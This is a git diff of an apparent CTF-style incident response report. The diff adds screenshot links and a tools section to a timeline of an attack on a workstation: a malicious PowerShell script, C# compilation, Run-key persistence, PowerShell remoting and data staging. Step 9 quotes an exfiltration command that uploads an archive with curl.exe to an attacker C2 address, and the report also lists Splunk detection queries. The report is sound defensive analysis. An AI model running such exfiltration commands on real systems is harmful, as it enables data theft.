@@ -33,7 +33,7 @@ On September 10, 2026, a targeted cyberattack was detected on a development work
 *   **Asset:** `THM-SREYES`
 *   **IOCs:** `C:\Users\s.reyes\Downloads\NeuralNexusReview\review-helper.ps1`
 
-*(Встав сюди скріншот Event ID 1 - створення процесу)*
+![Step 1: User execution of the malicious script](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/1_Opening%20Malicious%20File.png)
 
 ### Step 2: Execution of Malicious Script
 *   **Timestamp:** `2026-09-10 12:29:49`
@@ -44,7 +44,9 @@ On September 10, 2026, a targeted cyberattack was detected on a development work
 *   **Asset:** `THM-SREYES`
 *   **IOCs:** `nx3yvfmc.cmdline`, `nx3yvfmc.dll`
 
-*(Встав сюди скріншот створення файлів у Temp)*
+![Step 2: Creation of the C# source file and placeholder DLL](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/2_cmdline%20file%20created.png)
+
+![Step 2: Creation of the empty DLL placeholder](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/2_dll%20file%20created.png)
 
 ### Step 3: Compilation (Defense Evasion)
 *   **Timestamp:** `2026-09-10 12:29:49`
@@ -65,7 +67,6 @@ On September 10, 2026, a targeted cyberattack was detected on a development work
 *   **Asset:** `THM-SREYES`
 *   **IOCs:** `45.147.230.131`, port `8443`
 
-*(Встав сюди скріншот Event ID 3 - мережеві з'єднання)*
 
 ### Step 5: Persistence
 *   **Timestamp:** `2026-09-10 12:37:20`
@@ -76,7 +77,7 @@ On September 10, 2026, a targeted cyberattack was detected on a development work
 *   **Asset:** `THM-SREYES`
 *   **IOCs:** Registry Key: `HKU\...\Run\NeuralNexusReview`; File: `C:\Users\s.reyes\AppData\Local\NeuralNexus\review-helper.ps1`
 
-*(Встав сюди скріншот Event ID 13 - зміна реєстру)*
+![Step 5: Persistence established via Registry Run Key](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/5_Persistence.png)
 
 ### Step 6: Lateral Movement (PowerShell Remoting)
 *   **Timestamp:** `2026-09-10 16:27:01`
@@ -87,7 +88,7 @@ On September 10, 2026, a targeted cyberattack was detected on a development work
 *   **Asset:** `THM-SREYES` (targeting `THM-MSMITH`)
 *   **IOCs:** Command: `New-PSSession -ComputerName THM-MSMITH`
 
-*(Встав сюди скріншот Event ID 4104 з командою New-PSSession)*
+![Step 6: Lateral Movement via PowerShell Remoting (New-PSSession)](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/6_Lateral%20Movement.png)
 
 ### Step 7: Collection (Data Staging)
 *   **Timestamp:** `2026-09-10 16:27:01`
@@ -98,7 +99,7 @@ On September 10, 2026, a targeted cyberattack was detected on a development work
 *   **Asset:** `THM-SREYES` & `THM-MSMITH`
 *   **IOCs:** Paths: `C:\StudioMarketing\approved-release\*`, `C:\StudioProjects\NeuralNexus\release-notes`
 
-*(Встав сюди скріншот Event ID 4104 з командою Copy-Item)*
+![Step 7: Data Collection and Staging from remote and local systems](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/7_Collection.png)
 
 ### Step 8: Archive Creation (Staging)
 *   **Timestamp:** `2026-09-10 16:27:28`
@@ -109,7 +110,7 @@ On September 10, 2026, a targeted cyberattack was detected on a development work
 *   **Asset:** `THM-SREYES`
 *   **IOCs:** Archive: `C:\Users\s.reyes\AppData\Local\Temp\review-cache.zip`
 
-*(Встав сюди скріншот Event ID 4104 з командою Compress-Archive)*
+![Step 8: Archive creation of the staged data (review-cache.zip)](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/8_Archive%20Creation.png)
 
 ### Step 9: Exfiltration
 *   **Timestamp:** `2026-09-10 16:27:54`
@@ -120,7 +121,7 @@ On September 10, 2026, a targeted cyberattack was detected on a development work
 *   **Asset:** `THM-SREYES`
 *   **IOCs:** Command: `curl.exe --fail --show-error --insecure --upload-file ... https://45.147.230.131:8443/ingest/review-cache.zip`
 
-*(Встав сюди скріншот виконання curl.exe)*
+![Step 9: Data Exfiltration to the C2 server using curl.exe](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/9_Exfiltration.png)
 
 ---
 
@@ -175,3 +176,21 @@ index=* "review-cache.zip" | sort _time
 
 # 5. Detect csc.exe compilation (Compile After Delivery)
 index=* EventCode=1 Image="*csc.exe" CommandLine="*.cmdline*"
+```
+---
+
+## 🛠️ Tools & Technologies Used
+
+### Defensive Tools (Analyst Side)
+*   **SIEM:** Splunk (SPL queries for event correlation and pivoting).
+*   **Logging:** Sysmon (Event IDs 1, 3, 11, 13), Windows PowerShell Operational Logs (Event ID 4104).
+*   **Threat Intelligence:** VirusTotal (IP reputation check).
+
+### Offensive Tools (Adversary Side - Observed in Logs)
+*   **Execution:** PowerShell (`powershell.exe`), `explorer.exe`.
+*   **Defense Evasion:** `csc.exe` (C# Compiler), `cvtres.exe`.
+*   **C2 / Exfiltration:** Custom C2 server (`45.147.230.131:8443`), `curl.exe` (Living off the Land).
+*   **Collection / Staging:** `Compress-Archive` (PowerShell cmdlet), `New-PSSession`.
+
+### Frameworks
+*   MITRE ATT&CK Framework (for mapping TTPs).
